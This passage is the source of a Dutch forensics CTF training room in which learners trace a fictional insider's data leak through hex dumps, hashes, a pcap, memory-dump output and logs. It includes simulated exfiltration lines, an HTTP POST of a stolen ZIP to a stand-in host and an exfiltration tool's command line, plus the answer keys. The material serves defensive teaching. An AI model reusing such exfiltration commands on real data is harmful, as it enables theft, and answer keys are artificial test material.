/* Room: Forensie-CTF — Zaak Zilverlab (capstone) */

// --- Vlag 3: pcap met de exfiltratie van de buit ---
const PCAP_ZAAK = [
  { no: 1, time: '0.000', src: '10.10.80.5', dst: '10.10.80.1', proto: 'DNS', len: 78, info: 'Standaardquery A share.zilverlab.lab' },
  { no: 2, time: '0.014', src: '10.10.80.1', dst: '10.10.80.5', proto: 'DNS', len: 94, info: 'Antwoord A share.zilverlab.lab = 10.10.50.20' },
  { no: 3, time: '1.210', src: '10.10.80.5', dst: '10.10.50.20', proto: 'SMB', len: 320, info: 'SMB2 Read  \\\\zilverlab\\onderzoek\\prototype.zip' },
  { no: 4, time: '1.260', src: '10.10.50.20', dst: '10.10.80.5', proto: 'SMB', len: 1480, info: 'SMB2 Read Response (bestand gelezen)' },
  { no: 5, time: '48.300', src: '10.10.80.5', dst: '10.10.90.77', proto: 'DNS', len: 80, info: 'Standaardquery A leak.jvt.lab' },
  { no: 6, time: '48.330', src: '10.10.80.5', dst: '10.10.90.77', proto: 'TCP', len: 74, info: '51210 -> 80 [SYN]' },
  { no: 7, time: '48.344', src: '10.10.90.77', dst: '10.10.80.5', proto: 'TCP', len: 74, info: '80 -> 51210 [SYN, ACK]' },
  {
    no: 8, time: '48.360', src: '10.10.80.5', dst: '10.10.90.77', proto: 'HTTP', len: 5120,
    info: 'POST /drop HTTP/1.1  (data 4.820 bytes!)',
    stream: `POST /drop HTTP/1.1
Host: leak.jvt.lab
User-Agent: wexport/1.2
Content-Type: application/octet-stream
Content-Length: 4820
X-Case: JVT{buit_onderschept}

PK..........prototype.zip......(binaire ZIP-inhoud: gestolen onderzoeksdata)......

HTTP/1.1 200 OK
Server: nginx
Content-Length: 8

ontvangen`,
  },
  { no: 9, time: '48.690', src: '10.10.90.77', dst: '10.10.80.5', proto: 'HTTP', len: 190, info: 'HTTP/1.1 200 OK (text/plain)' },
  { no: 10, time: '48.700', src: '10.10.80.5', dst: '10.10.90.77', proto: 'TCP', len: 66, info: '51210 -> 80 [ACK]' },
  { no: 11, time: '52.900', src: '10.10.80.5', dst: '10.10.50.10', proto: 'HTTP', len: 410, info: 'GET /intranet HTTP/1.1 (normaal verkeer)' },
  { no: 12, time: '53.100', src: '10.10.50.10', dst: '10.10.80.5', proto: 'HTTP', len: 1320, info: 'HTTP/1.1 200 OK (text/html)' },
];

// --- Vlag 5: logs met de tijdlijn ---
const LOGS_ZAAK = `2026-09-28 08:02:11 WS-DEKKER Security 4624 Logon geslaagd       Account=j.dekker   LogonType=2 (Interactief)
2026-09-28 08:02:11 WS-DEKKER Security 4672 Speciale rechten toegekend  Account=j.dekker
2026-09-28 09:15:40 WS-DEKKER Security 4624 Logon geslaagd       Account=m.visser   LogonType=3 (Netwerk)
2026-09-28 12:30:44 WS-DEKKER Security 4634 Logoff              Account=j.dekker
2026-09-28 13:05:02 WS-DEKKER Security 4624 Logon geslaagd       Account=j.dekker   LogonType=2 (Interactief)
2026-09-28 17:48:19 WS-DEKKER Security 4634 Logoff              Account=j.dekker
2026-09-28 18:10:55 WS-DEKKER Security 4634 Logoff              Account=m.visser
2026-09-28 23:14:07 WS-DEKKER Security 4624 Logon geslaagd       Account=j.dekker   LogonType=2 (Interactief)   [!] buiten werktijd
2026-09-28 23:15:33 WS-DEKKER Sysmon   1    ProcessCreate        Image=C:\\Users\\jdekker\\AppData\\Roaming\\wexport.exe  Parent=explorer.exe
2026-09-28 23:16:10 WS-DEKKER Security 5140 Netwerkshare benaderd  Share=\\\\zilverlab\\onderzoek  Account=j.dekker
2026-09-28 23:17:02 WS-DEKKER Sysmon   11   FileCreate           Image=wexport.exe  Target=C:\\Users\\jdekker\\AppData\\Roaming\\prototype.zip
2026-09-28 23:18:52 WS-DEKKER Sysmon   3    NetworkConnect       Image=wexport.exe  Dest=10.10.90.77:80
2026-09-28 23:19:40 WS-DEKKER Security 4634 Logoff              Account=j.dekker
2026-09-29 07:55:12 WS-DEKKER Security 4624 Logon geslaagd       Account=m.visser   LogonType=2 (Interactief)
2026-09-29 09:03:00 WS-DEKKER SOC-tag  incident ZILVERLAB: na-werktijd logon j.dekker + share-toegang + upload naar 10.10.90.77 = JVT{tijdlijn_rond}`;

CS.registerRoom({
  id: 'forensie-ctf',
  path: 'forensie',
  order: 10,
  title: 'Forensie-CTF: Zaak Zilverlab',
  icon: '🔎',
  difficulty: 'Moeilijk',
  minutes: 100,
  summary: 'De afsluitende zaak van het forensie-pad. Bij Zilverlab B.V. is vertrouwelijk onderzoek gelekt door een insider. Jij doorloopt als digitaal rechercheur de volledige onderzoekslijn — van verdacht bestand tot gecodeerde boodschap — en verzamelt zes vlaggen.',
  objectives: [
    'Een forensisch onderzoek van begin tot eind uitvoeren met de juiste volgorde en zorgvuldigheid',
    'Een bestandstype herkennen aan de magic bytes en een verborgen string vinden (file carving)',
    'De integriteit van bewijs aantonen met hashing en de chain of custody bewaken',
    'Exfiltratie uit een pcap halen, een proces uit een geheugendump ontmaskeren en een tijdlijn reconstrueren uit logs',
    'Een gecodeerde boodschap ontcijferen en codering onderscheiden van encryptie',
    'Een helder forensisch rapport opbouwen: feiten, interpretatie, reproduceerbaarheid en bewijsketen',
  ],
  tasks: [
    {
      title: 'Taak 1 — De opdracht: Zaak Zilverlab',
      content: `
        <p>Welkom, rechercheur. Dit is je eindonderzoek. <strong>Zilverlab B.V.</strong> (volledig fictief) is een
        researchbedrijf dat ontdekte dat zijn geheime prototype-onderzoek is <strong>gelekt</strong>. Alles wijst op een
        <strong>insider</strong>: een medewerker met toegang die data naar buiten heeft gesmokkeld. De verdenking valt op
        het account <code>j.dekker</code> en de werkplek <code>WS-DEKKER</code> (<code>10.10.80.5</code>).</p>

        <p>Je bent ingeschakeld door het <strong>Team Cybercrime</strong> van de politie. Er ligt een geldige
        <strong>machtiging</strong> van de rechter-commissaris om de in beslag genomen werkplek, een geheugendump, een
        netwerkopname en de logs te onderzoeken. Zonder die machtiging zou je onderzoek onrechtmatig zijn — en daarmee
        het bewijs onbruikbaar.</p>

        <div class="callout danger">
          <strong>Ethiek en rechtmatigheid, eerst:</strong> een digitaal rechercheur werkt altijd binnen de wet. Je
          onderzoekt alleen wat de machtiging toestaat, je raakt het origineel niet aan (je werkt op kopieën), en je
          bewaakt de <strong>chain of custody</strong> (bewijsketen). Ga je buiten je bevoegdheid, dan pleeg je zelf
          computervredebreuk (art. 138ab Sr) en sneuvelt de zaak bij de rechter.
        </div>

        <h3>Je onderzoekslijn</h3>
        <p>Je doorloopt zes stappen en verzamelt bij elke stap een vlag (<code>JVT{...}</code>):</p>
        <ol>
          <li><strong>Het verdachte bestand</strong> — herken het echte bestandstype aan de magic bytes (hex).</li>
          <li><strong>Integriteit van bewijs</strong> — bevestig met een hash dat er niet is geknoeid, en lees het bewijs.</li>
          <li><strong>De exfiltratie</strong> — vind in de netwerkopname hoe de buit naar buiten ging.</li>
          <li><strong>De geheugendump</strong> — ontmasker het kwaadaardige proces op de werkplek.</li>
          <li><strong>De tijdlijn</strong> — reconstrueer uit de logs wie wanneer wat deed.</li>
          <li><strong>De gecodeerde boodschap</strong> — ontcijfer de verborgen notitie van de dader.</li>
        </ol>
        <p>Werk als een echte onderzoeker: noteer per stap je feiten, zodat je straks een rapport kunt schrijven.</p>
      `,
      questions: [
        { q: 'Wat maakt jouw onderzoek in deze zaak rechtmatig?', options: ['Een geldige machtiging en het werken binnen de grenzen daarvan', 'Dat het bedrijf fictief is', 'Dat je snel werkt', 'Niets, dat hoeft niet'], answer: 0, explain: 'Een machtiging en het respecteren van de bevoegdheid maken het onderzoek rechtmatig; anders is het bewijs onbruikbaar.' },
        { q: 'Op welk account en welke werkplek valt de verdenking?', answer: ['j.dekker', 'jdekker', 'dekker'], hint: 'Lees de opdracht: het account van de verdachte medewerker.', explain: 'De verdenking valt op het account j.dekker op de werkplek WS-DEKKER (10.10.80.5).' },
        { q: 'Waarom werk je op kopieen en niet op het origineel?', options: ['Om het originele bewijs onaangeroerd en controleerbaar te houden', 'Omdat kopieen sneller zijn', 'Omdat het origineel versleuteld is', 'Dat hoeft niet'], answer: 0, explain: 'Je bewaakt de integriteit en de chain of custody door nooit op het origineel te werken.' },
        { q: 'Ik heb een machtiging, werk op kopieen en ga de zes stappen van de onderzoekslijn doorlopen.', noAnswer: true },
      ],
    },

    {
      title: 'Taak 2 — Vlag 1: het verdachte bestand (magic bytes)',
      content: `
        <p>Op de werkplek stond een bestand dat <code>vakantiefoto.jpg</code> heet. Maar de naam en de extensie van een
        bestand zeggen niets: die kan iedereen veranderen. Wat een bestand <em>echt</em> is, lees je aan de eerste bytes:
        de <strong>magic bytes</strong> (ook wel de <em>file signature</em> of handtekening). Elk bestandstype begint met
        een vast patroon.</p>

        <h3>Een paar bekende handtekeningen</h3>
        <table>
          <thead><tr><th>Eerste bytes (hex)</th><th>ASCII</th><th>Bestandstype</th></tr></thead>
          <tbody>
            <tr><td><code>FF D8 FF</code></td><td>—</td><td>JPEG-afbeelding</td></tr>
            <tr><td><code>89 50 4E 47</code></td><td><code>.PNG</code></td><td>PNG-afbeelding</td></tr>
            <tr><td><code>25 50 44 46</code></td><td><code>%PDF</code></td><td>PDF-document</td></tr>
            <tr><td><code>50 4B 03 04</code></td><td><code>PK..</code></td><td>ZIP-archief (ook .docx, .xlsx)</td></tr>
          </tbody>
        </table>

        <p>Bekijk het bestand in de hex-viewer hieronder. De linkerkolom is de offset, in het midden staan de bytes (hex),
        rechts de leesbare ASCII. Let op:</p>
        <ol>
          <li><strong>Lees de eerste bytes.</strong> Vergelijk ze met de tabel. Is dit echt een JPEG? De naam zegt van
          wel...</li>
          <li><strong>Lees de ASCII-kolom.</strong> Verderop in het bestand staat leesbare tekst — en daarin een vlag.</li>
        </ol>

        <div class="callout tip">
          <strong>Tip:</strong> klap de "spiekbrief met bestandssignaturen" in de viewer open als je twijfelt. Een
          bestand met <code>50 4B 03 04</code> is in werkelijkheid een ZIP-archief, hoe het ook heet. Een
          <code>.jpg</code> die eigenlijk een ZIP is, is precies het soort misleiding dat een insider gebruikt om data te
          verstoppen.
        </div>
      `,
      lab: {
        type: 'hexviewer',
        filename: 'vakantiefoto.jpg',
        hex: '50 4B 03 04 14 00 00 00 00 00 08 00 08 00 6E 6F 74 69 74 69 65 2E 74 78 74 0A 42 45 57 49 4A 53 20 2D 20 4A 56 54 7B 6D 61 67 69 73 63 68 65 5F 62 79 74 65 73 7D 0A',
      },
      questions: [
        { q: 'Wat is dit bestand in werkelijkheid (kijk naar de magic bytes), ondanks de naam .jpg?', answer: ['ZIP', 'zip', 'ZIP-archief', 'een zip'], hint: 'De eerste bytes zijn 50 4B 03 04 — zoek die op in de tabel.', explain: 'De handtekening 50 4B 03 04 (PK..) hoort bij een ZIP-archief, niet bij een JPEG.' },
        { q: 'Welke vier bytes (hex) staan helemaal vooraan in het bestand?', answer: ['50 4B 03 04', '504b0304', '50 4b 03 04', '50 4B 03 04 '], hint: 'De allereerste rij van de hex-dump, vier byteparen.', explain: 'De eerste vier bytes 50 4B 03 04 zijn de ZIP-signatuur (PK\\x03\\x04).' },
        { q: 'Welke vlag staat verstopt in de ASCII-kolom van het bestand?', answer: ['JVT{magische_bytes}'], encoded: true, hint: 'Lees de leesbare tekst rechts in de hex-dump (na "BEWIJS -").', explain: 'In de ASCII staat "BEWIJS - JVT{magische_bytes}". De bytes zelf bevatten de leesbare vlag.' },
      ],
    },

    {
      title: 'Taak 3 — Vlag 2: integriteit en de bewijsketen',
      content: `
        <p>Uit de in beslag genomen schijf is een stukje data <em>gecarved</em> (teruggehaald): het bestand
        <code>carved_0x4e20.bin</code>. Voordat je het als bewijs gebruikt, moet je twee dingen doen: de
        <strong>integriteit</strong> aantonen, en de <strong>inhoud</strong> veilig lezen.</p>

        <h3>Stap 1 — Integriteit: komt de hash overeen?</h3>
        <p>In het <strong>bewijslogboek</strong> (de chain of custody) is bij het veiligstellen vastgelegd:</p>
        <pre><code>SHA-256 = 730c5a2e1394e9cb07e9b94a3f0450e197828bd7564ff8a016abe22d065f2827</code></pre>
        <p>Bereken nu zelf de hash van het bestand en vergelijk. Typ in de terminal:</p>
        <pre><code>sha256sum carved_0x4e20.bin</code></pre>
        <p>Komt jouw uitkomst exact overeen met de vastgelegde hash, dan staat vast dat er niet met het bestand is
        geknoeid sinds het veiligstellen. Eén verschillend teken en de hashes zouden totaal afwijken.</p>

        <h3>Stap 2 — Inhoud: haal de leesbare tekst eruit</h3>
        <p>Een <code>.bin</code> is ruwe data. Met <code>strings</code> haal je de <em>leesbare</em> stukjes tekst eruit,
        zonder dat je door de ruis hoeft. Typ:</p>
        <pre><code>strings carved_0x4e20.bin</code></pre>
        <p>Lees de uitvoer: welk account wordt genoemd, welk doel, en welke vlag liet de analist achter?</p>

        <div class="callout info">
          <strong>Waarom dit cruciaal is:</strong> zonder bewezen integriteit kan de verdediging bij de rechter zeggen
          "dat bewijs is misschien aangepast". De hash is je wiskundige garantie. Noteer in je rapport dat de berekende
          hash overeenkwam met de vastgelegde hash.
        </div>
      `,
      lab: {
        type: 'terminal',
        user: 'analist', host: 'nfi-lab',
        home: '/home/analist', cwd: '/home/analist/zaak-zilverlab/bewijs',
        motd: 'NFI forensisch lab — Zaak Zilverlab. Werkmap: zaak-zilverlab/bewijs. Typ de commando\'s uit de opdracht.',
        fs: {
          '/home/analist/zaak-zilverlab/bewijs/carved_0x4e20.bin': 'MEMO - vertrouwelijk\nAccount: j.dekker\nDoel: 10.10.80.5\nNotitie van analist: JVT{integriteit_bewezen}\n',
          '/home/analist/zaak-zilverlab/bewijs/LEESMIJ.txt': 'Vastgelegde SHA-256 van carved_0x4e20.bin:\n730c5a2e1394e9cb07e9b94a3f0450e197828bd7564ff8a016abe22d065f2827\nControleer met sha256sum voordat je het bewijs gebruikt.\n',
          '/home/analist/zaak-zilverlab/logboek.txt': 'Chain of custody - Zaak Zilverlab\n2026-09-29 10:15 veiliggesteld door rechercheur (machtiging RC-2026-0442)\n2026-09-29 10:16 SHA-256 berekend en vastgelegd\n',
        },
        commands: {
          'sha256sum carved_0x4e20.bin': '730c5a2e1394e9cb07e9b94a3f0450e197828bd7564ff8a016abe22d065f2827  carved_0x4e20.bin',
          'sha256sum /home/analist/zaak-zilverlab/bewijs/carved_0x4e20.bin': '730c5a2e1394e9cb07e9b94a3f0450e197828bd7564ff8a016abe22d065f2827  /home/analist/zaak-zilverlab/bewijs/carved_0x4e20.bin',
        },
      },
      questions: [
        { q: 'Komt de berekende SHA-256 overeen met de vastgelegde hash in het logboek?', options: ['Ja, ze zijn identiek — de integriteit is bewezen', 'Nee, ze verschillen', 'Dat kun je niet controleren', 'Alleen MD5 kan dat'], answer: 0, explain: 'sha256sum geeft exact 730c5a2e...065f2827, gelijk aan de vastgelegde hash. Het bewijs is onaangeroerd.' },
        { q: 'Welke vlag liet de analist achter in het bestand (gebruik strings)?', answer: ['JVT{integriteit_bewezen}'], hint: 'Run "strings carved_0x4e20.bin" (of cat) en lees de notitieregel.', explain: 'strings toont de leesbare tekst, waaronder "Notitie van analist: JVT{integriteit_bewezen}".' },
        { q: 'Welk account wordt in het bewijsbestand genoemd?', answer: ['j.dekker', 'jdekker', 'dekker'], hint: 'Kijk bij "Account:" in de strings-uitvoer.', explain: 'Het bestand noemt Account: j.dekker — dezelfde verdachte als in de opdracht.' },
        { q: 'Waarom bewijst een gelijke hash dat er niet is geknoeid?', options: ['Elke wijziging, zelfs 1 bit, geeft een totaal andere hash', 'Omdat de hash kort is', 'Omdat SHA-256 geheim is', 'Dat bewijst het niet'], answer: 0, explain: 'Een cryptografische hash verandert volledig bij de kleinste wijziging; gelijke hashes betekenen identieke data.' },
      ],
    },

    {
      title: 'Taak 4 — Vlag 3: de exfiltratie in de pcap',
      content: `
        <p>Je weet nu dat er data is gestolen. Maar hoe ging de buit naar buiten? Je hebt de netwerkopname van
        <code>WS-DEKKER</code> rond het tijdstip van het incident. Vind de uitgaande overdracht en reconstrueer hem.</p>

        <h3>Zo pak je het aan</h3>
        <ol>
          <li><strong>Zie het begin.</strong> Bovenaan haalt de werkplek via <code>SMB</code> een bestand
          (<code>prototype.zip</code>) van de interne share <code>\\\\zilverlab\\onderzoek</code>. Dat is de buit die wordt
          klaargezet.</li>
          <li><strong>Zoek de upload.</strong> Filter op <code>http</code> en zoek de grote <code>POST</code>. Let op de
          lengte (<code>len</code>): één pakket is veel groter dan de rest — daar gaat data naar buiten.</li>
          <li><strong>Volg de stream.</strong> Klik het POST-pakket aan, open "Follow stream" en lees de hele HTTP-POST:
          naar welke host, met welke tool (de <code>User-Agent</code>!), en welke vlag in de kop staat.</li>
        </ol>

        <div class="callout tip">
          <strong>Tip:</strong> de upload gaat naar het externe IP <code>10.10.90.77</code> (host <code>leak.jvt.lab</code>).
          Kijk ook naar de User-Agent <code>wexport/1.2</code> — dat is geen browser, maar een exfiltratietool. Onthoud
          die naam; je komt hem in de geheugendump en de logs weer tegen.
        </div>
      `,
      lab: { type: 'pcap', title: 'zilverlab-netwerk.pcap', packets: PCAP_ZAAK },
      questions: [
        { q: 'Naar welk extern IP-adres werd de buit geuploadt?', answer: ['10.10.90.77'], hint: 'Kijk naar de bestemming (dst) van het grote POST-pakket.', explain: 'De POST ging naar 10.10.90.77 (leak.jvt.lab), buiten het interne netwerk.' },
        { q: 'Welke tool deed de upload (lees de User-Agent in de stream)?', answer: ['wexport', 'wexport/1.2', 'wexport.exe'], hint: 'In de HTTP-kop staat User-Agent: ...', explain: 'De User-Agent is wexport/1.2 — geen browser maar een exfiltratietool. Dezelfde naam zie je terug in geheugen en logs.' },
        { q: 'Welke vlag staat in de HTTP-kop van de POST (Follow stream)?', answer: ['JVT{buit_onderschept}'], encoded: true, hint: 'Open Follow stream op het grote POST-pakket en lees de X-Case-regel.', explain: 'In de header X-Case staat JVT{buit_onderschept}; eronder de binaire ZIP met de gestolen onderzoeksdata.' },
      ],
    },

    {
      title: 'Taak 5 — Vlag 4: ontmasker het proces in de geheugendump',
      content: `
        <p>De werkplek is "live" in beslag genomen, dus er is een geheugendump (<code>ws-dekker.raw</code>) gemaakt
        volgens de order of volatility: RAM eerst. Met Volatility 3 ontmasker je het proces dat de data naar buiten
        stuurde.</p>

        <h3>Zo pak je het aan</h3>
        <ol>
          <li><strong>Bekijk de processen.</strong> Draai <code>windows.pslist</code>. Tussen de normale processen staat
          er een die niet thuishoort op een financiele werkplek.</li>
          <li><strong>Bekijk de verbindingen.</strong> Draai <code>windows.netscan</code>. Welk proces heeft een
          uitgaande verbinding naar het externe IP uit de vorige taak?</li>
          <li><strong>Lees de opdrachtregel.</strong> Draai <code>windows.cmdline</code>. Het echte pad verraadt dat het
          uit een gebruikersmap draait, en in de argumenten staat de vlag.</li>
        </ol>
        <p>Voer precies uit:</p>
        <pre><code>python3 vol.py -f ws-dekker.raw windows.pslist
python3 vol.py -f ws-dekker.raw windows.netscan
python3 vol.py -f ws-dekker.raw windows.cmdline</code></pre>

        <div class="callout info">
          <strong>Samenhang:</strong> let op hoe het bewijs klopt over de bronnen heen. De tool <code>wexport.exe</code>
          die je in de pcap als User-Agent zag, draait hier als proces en praat met hetzelfde IP <code>10.10.90.77</code>.
          Dat is precies wat een sterk forensisch verhaal maakt: meerdere, onafhankelijke bronnen wijzen dezelfde kant op.
        </div>
      `,
      lab: {
        type: 'terminal',
        user: 'analist', host: 'nfi-lab',
        home: '/home/analist', cwd: '/home/analist',
        motd: 'NFI geheugenlab — dump ws-dekker.raw. Ontmasker het exfiltratieproces.',
        commands: {
          'python3 vol.py -f ws-dekker.raw windows.pslist': `Volatility 3 Framework 2.7.0

PID    PPID   ImageFileName   Threads  SessionId  CreateTime
4      0      System          138      N/A        2026-09-28 07:50:01 UTC
524    516    services.exe    6        0          2026-09-28 07:50:03 UTC
636    524    svchost.exe     19       0          2026-09-28 07:50:04 UTC
1180   1092   explorer.exe    54       1          2026-09-28 08:02:11 UTC
2210   1180   OUTLOOK.EXE     22       1          2026-09-28 08:05:40 UTC
2880   1180   EXCEL.EXE       18       1          2026-09-28 08:09:12 UTC
5120   1180   wexport.exe     4        1          2026-09-28 23:15:33 UTC`,
          'python3 vol.py -f ws-dekker.raw windows.netscan': `Volatility 3 Framework 2.7.0

Proto  LocalAddr     LocalPort  ForeignAddr   ForeignPort  State        PID    Owner
TCPv4  10.10.80.5    50140      10.10.1.1     443          ESTABLISHED  2210   OUTLOOK.EXE
TCPv4  10.10.80.5    51210      10.10.90.77   80           ESTABLISHED  5120   wexport.exe
UDPv4  10.10.80.5    53         *             *            *            636    svchost.exe

(!) wexport.exe (PID 5120) praat met 10.10.90.77:80 — hetzelfde IP als de exfil-upload.`,
          'python3 vol.py -f ws-dekker.raw windows.cmdline': `Volatility 3 Framework 2.7.0

PID    Process        Args
2210   OUTLOOK.EXE    "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
2880   EXCEL.EXE      "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
5120   wexport.exe    C:\\Users\\jdekker\\AppData\\Roaming\\wexport.exe --dst 10.10.90.77 --tag JVT{proces_ontmaskerd}`,
        },
      },
      questions: [
        { q: 'Welk proces hoort niet thuis en deed de exfiltratie?', answer: ['wexport.exe', 'wexport'], hint: 'Vergelijk met de bekende Office/systeemprocessen; één valt op en start om 23:15.', explain: 'wexport.exe (PID 5120, kind van explorer.exe) is de exfiltratietool — dezelfde naam als de User-Agent in de pcap.' },
        { q: 'Met welk extern IP praat dit proces (windows.netscan)?', answer: ['10.10.90.77'], hint: 'Kijk bij de ForeignAddr op de wexport.exe-regel.', explain: 'wexport.exe (PID 5120) verbindt met 10.10.90.77:80 — hetzelfde IP als de upload in de pcap.' },
        { q: 'Vanuit welke map draait wexport.exe (windows.cmdline)?', answer: ['AppData', 'C:\\Users\\jdekker\\AppData\\Roaming', 'appdata', 'Roaming'], hint: 'Lees het pad in de Args-kolom; het is geen System32.', explain: 'Het draait uit C:\\Users\\jdekker\\AppData\\Roaming — een gebruikersmap, niet System32: verdacht.' },
        { q: 'Welke vlag staat in de opdrachtregel van wexport.exe?', answer: ['JVT{proces_ontmaskerd}'], hint: 'Lees de --tag in de Args van windows.cmdline.', explain: 'De argumenten bevatten --tag JVT{proces_ontmaskerd}.' },
      ],
    },

    {
      title: 'Taak 6 — Vlag 5: reconstrueer de tijdlijn uit de logs',
      content: `
        <p>Je hebt het hoe (exfiltratie) en het wat (wexport.exe). Nu het <strong>wanneer</strong> en de onweerlegbare
        koppeling aan een account. Je krijgt de gecombineerde Windows Security- en Sysmon-logs van <code>WS-DEKKER</code>.
        Bouw de <strong>tijdlijn</strong> van de avond van het incident.</p>

        <h3>Wat je zoekt</h3>
        <ol>
          <li><strong>De afwijkende login.</strong> Overdag logt <code>j.dekker</code> normaal in en uit. Zoek de login
          <em>buiten werktijd</em> (laat op de avond). Event <code>4624</code> is een geslaagde logon. Noteer het
          tijdstip.</li>
          <li><strong>De keten van acties.</strong> Vlak na die login verschijnen: het starten van
          <code>wexport.exe</code> (Sysmon event <code>1</code>, ProcessCreate), toegang tot de share
          <code>\\\\zilverlab\\onderzoek</code> (event <code>5140</code>), en een netwerkverbinding naar
          <code>10.10.90.77</code> (Sysmon event <code>3</code>). Dat is het hele verhaal op één tijdlijn.</li>
          <li><strong>De vlag.</strong> Onderaan tagde de SOC-analist het incident. Daarin staat de vlag. Filter desnoods
          op <code>JVT</code> of op <code>SOC-tag</code>.</li>
        </ol>

        <div class="callout tip">
          <strong>Filtertip:</strong> filter eerst op <code>4624</code> om alle logins te zien, en let op het ene tijdstip
          dat afwijkt (diep in de avond). Filter daarna op <code>j.dekker</code> om alles van dat account op een rij te
          krijgen. Zo bouw je een tijdlijn: login, tool gestart, share benaderd, data naar buiten.
        </div>
      `,
      lab: { type: 'logs', title: 'WS-DEKKER — Security + Sysmon', lines: LOGS_ZAAK },
      questions: [
        { q: 'Welk account logde buiten werktijd (laat op de avond) in?', answer: ['j.dekker', 'jdekker', 'dekker'], hint: 'Zoek de 4624-logon rond 23:14; welk account?', explain: 'Om 23:14 logde j.dekker interactief in — ruim buiten werktijd, het begin van de keten.' },
        { q: 'Hoe laat (uu:mm) vond die afwijkende login plaats?', answer: ['23:14', '23:14:07'], hint: 'Lees het tijdstip op de 4624-regel met de markering "buiten werktijd".', explain: 'De afwijkende logon was om 23:14:07, direct gevolgd door het starten van wexport.exe.' },
        { q: 'Welke share werd tijdens het incident benaderd (event 5140)?', answer: ['\\\\zilverlab\\onderzoek', 'zilverlab\\onderzoek', '\\\\zilverlab\\onderzoek', 'onderzoek'], hint: 'Kijk bij de 5140-regel naar Share=...', explain: 'De netwerkshare \\\\zilverlab\\onderzoek werd benaderd — de bron van het gelekte prototype.' },
        { q: 'Welke vlag staat in de SOC-tag onderaan de logs?', answer: ['JVT{tijdlijn_rond}'], hint: 'Filter op "SOC-tag" of op "JVT" en lees de laatste regel.', explain: 'De analist tagde: na-werktijd logon + share-toegang + upload = JVT{tijdlijn_rond}.' },
      ],
    },

    {
      title: 'Taak 7 — Vlag 6: ontcijfer de boodschap van de dader',
      content: `
        <p>Laatste stap. Op de werkplek stond nog een "beveiligde" notitie van de dader. Die dacht slim te zijn en heeft
        hem <em>gecodeerd</em> — maar jij weet dat codering geen encryptie is. Er is geen geheime sleutel nodig om het
        terug te draaien.</p>

        <p>De boodschap luidt:</p>
        <pre><code>V0lHe21ubnhfdHJmeWJncmF9</code></pre>

        <p>Twee aanwijzingen:</p>
        <ul>
          <li>De tekens (letters, cijfers, hoofd- en kleine letters) zien eruit als <strong>Base64</strong>.</li>
          <li>Maar als je alleen Base64 decodeert, krijg je nog geen leesbare vlag — de letters zijn daarna ook nog
          <strong>verschoven</strong> (zoals ROT13: elke letter 13 plaatsen opgeschoven).</li>
        </ul>

        <p>Gebruik CyberChef hieronder. Bouw het recept in de juiste volgorde:</p>
        <ol>
          <li>Eerst <strong>Base64 decoderen</strong>.</li>
          <li>Daarna <strong>ROT13</strong>.</li>
        </ol>
        <p>Lees de vlag in de uitvoer — en daarmee sluit je de zaak.</p>

        <div class="callout warn">
          <strong>Codering is geen encryptie:</strong> Base64 en ROT13 zijn omkeerbaar zonder sleutel. Ze verbergen iets
          hooguit voor het blote oog. Echte vertrouwelijkheid vraagt echte encryptie met een geheime sleutel. Noteer dat
          onderscheid ook in je rapport.
        </div>
      `,
      lab: { type: 'cyberchef', input: 'V0lHe21ubnhfdHJmeWJncmF9' },
      questions: [
        { q: 'Wat is de vlag na Base64-decoderen + ROT13?', answer: ['JVT{zaak_gesloten}'], encoded: true, hint: 'Recept: eerst "Base64 decoderen", dan "ROT13".', explain: 'Base64 is de buitenste laag, ROT13 de binnenste. Resultaat: JVT{zaak_gesloten}. Zaak afgerond!' },
        { q: 'Welk recept onthult de boodschap?', options: ['Base64 decoderen, daarna ROT13', 'Alleen MD5', 'Alleen URL-decoderen', 'XOR met een geheime sleutel'], answer: 0, explain: 'De boodschap is eerst met ROT13 verschoven en daarna Base64-gecodeerd; je draait dat in omgekeerde volgorde terug.' },
        { q: 'Waarom is dit geen echte versleuteling?', options: ['Base64 en ROT13 zijn omkeerbaar zonder geheime sleutel', 'Omdat het te kort is', 'Omdat het in CyberChef staat', 'Dat is het wel'], answer: 0, explain: 'Zonder sleutel terug te draaien = codering, geen encryptie. Echte encryptie vereist een geheime sleutel.' },
      ],
    },

    {
      title: 'Taak 8 — Rapportage: de zaak afronden',
      content: `
        <p>Gefeliciteerd, rechercheur. Je hebt zes vlaggen verzameld en daarmee de hele zaak gereconstrueerd: een verdacht
        bestand, bewezen integriteit, de exfiltratie, het kwaadaardige proces, de tijdlijn en de boodschap van de dader.
        Maar een onderzoek is pas af als je het kunt <strong>opschrijven</strong> zodat een officier van justitie en een
        rechter het kunnen volgen — en vertrouwen.</p>

        <h3>Wat hoort in een forensisch rapport?</h3>
        <ul>
          <li><strong>Feiten, los van interpretatie.</strong> Scheid wat je <em>zag</em> van wat je <em>denkt</em> dat het
          betekent. Feit: "om 23:18 verbond wexport.exe (PID 5120) met 10.10.90.77". Interpretatie: "dit duidt op
          exfiltratie van onderzoeksdata door account j.dekker". Een rechter wil die twee gescheiden zien.</li>
          <li><strong>Reproduceerbaarheid.</strong> Vermeld welke tools (met versie) en welke exacte commando's en filters
          je gebruikte. Een onafhankelijke deskundige moet met dezelfde bestanden tot dezelfde conclusie komen. Doet die
          dat niet, dan deugt je methode niet.</li>
          <li><strong>Chain of custody.</strong> Leg vast wie het bewijs wanneer veiligstelde, met welke machtiging, en
          de hashes (zoals de SHA-256 die je controleerde). Zo toon je aan dat er niet is geknoeid.</li>
          <li><strong>Bronnen die elkaar bevestigen.</strong> Je sterkste bewijs is dat onafhankelijke bronnen (bestand,
          geheugen, netwerk, logs) dezelfde kant op wijzen: steeds j.dekker, wexport.exe en 10.10.90.77.</li>
        </ul>

        <div class="callout info">
          <strong>En daarna:</strong> bij een datalek met persoonsgegevens kan een meldplicht gelden bij de
          <strong>Autoriteit Persoonsgegevens</strong>. Het bewijs gaat, samen met je rapport, naar het
          <strong>Team Cybercrime</strong> en het Openbaar Ministerie. Jij levert de feiten; de rechter weegt ze.
        </div>

        <h3>Hoe je verder groeit als digitaal rechercheur</h3>
        <ul>
          <li>Oefen met echte (veilige) zaken op platforms als CyberDefenders.</li>
          <li>Verdiep je in de tools: Volatility voor geheugen, Wireshark voor netwerk, Autopsy voor schijf.</li>
          <li>Blijf ethisch: je werkt binnen je machtiging, raakt het origineel niet aan, en rapporteert eerlijk — ook
          wat je niet zeker weet.</li>
        </ul>

        <div class="callout tip">
